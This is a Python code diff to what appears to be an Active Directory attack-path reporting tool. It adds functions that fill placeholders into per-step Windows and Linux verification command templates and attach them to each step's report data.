@@ -4224,6 +4688,44 @@ def render_step_remediation(step: dict[str, Any]) -> list[str]:
     return _technique_remediation()
 
 
+def _render_verify_template(tmpl: str, placeholders: dict[str, str]) -> str:
+    """Substitute step placeholders into a verification command template.
+
+    Uses literal ``{token}`` replacement rather than ``str.format`` because
+    verification commands legitimately contain shell/PowerShell brace blocks
+    (``Where-Object { ... }``) that ``str.format`` would misparse.
+    """
+    if not tmpl:
+        return ""
+    rendered = tmpl
+    for key, value in placeholders.items():
+        rendered = rendered.replace("{" + key + "}", value)
+    return rendered
+
+
+def render_step_verify(step: dict[str, Any]) -> dict[str, str]:
+    """Render the independent-verification commands for one attack-path step.
+
+    Returns ``{"windows": <native MS command>, "linux": <tool/reference>}`` with
+    the ``{source}``/``{target}``/``{template}`` placeholders substituted from the
+    concrete step. Either value is an empty string when not authored. This is the
+    ONE client-facing block permitted to name standard verification tools
+    (nxc/certipy/impacket/bloodyAD) — never competitors — so the client can
+    reproduce the finding by hand and rule out a false positive.
+    """
+    if not isinstance(step, dict):
+        return {"windows": "", "linux": ""}
+    relation_raw = step.get("action") or step.get("relation") or step.get("type") or ""
+    entry = get_attack_step_entry(str(relation_raw))
+    if entry is None:
+        return {"windows": "", "linux": ""}
+    placeholders = _extract_step_placeholders(step)
+    return {
+        "windows": _render_verify_template(entry.verify_windows, placeholders),
+        "linux": _render_verify_template(entry.verify_linux, placeholders),
+    }
+
+
 def resolve_technique_prose(vuln_key: str | None) -> dict[str, Any]:
     """Resolve canonical technique prose for a step from ``VULN_CATALOG``.
 
@@ -4303,6 +4805,8 @@ def build_step_knowledge(step: dict[str, Any]) -> dict[str, Any] | None:
             "step_summary": str,                # concise edge-specific summary label
             "remediation_steps": list[str],     # rendered, ordered, edge-specific
             "narrative": str,                   # rendered long-form sentence
+            "verify_windows": str,              # native MS check (omitted if absent)
+            "verify_linux": str,                # tool/reference check (omitted if absent)
             "mitre_technique_id": str | None,
             "mitre_technique_name": str | None,
             "vuln_key": str | None,             # the unification join to a finding
@@ -4337,6 +4841,13 @@ def build_step_knowledge(step: dict[str, Any]) -> dict[str, Any] | None:
         "mitre_technique_name": entry.mitre_technique_name,
         "vuln_key": entry.vuln_key,
     }
+    # Independent-verification block (client reproduces the finding by hand).
+    # Rendered against the step; omitted when not authored so the shape is clean.
+    _verify = render_step_verify(step)
+    if _verify.get("windows"):
+        knowledge["verify_windows"] = _verify["windows"]
+    if _verify.get("linux"):
+        knowledge["verify_linux"] = _verify["linux"]
     # Surface the remaining canonical prose fields when VULN_CATALOG carries
     # them — absent fields are omitted so the shape stays clean.
     for field_name in ("impact", "remediation", "remediation_options", "references"):
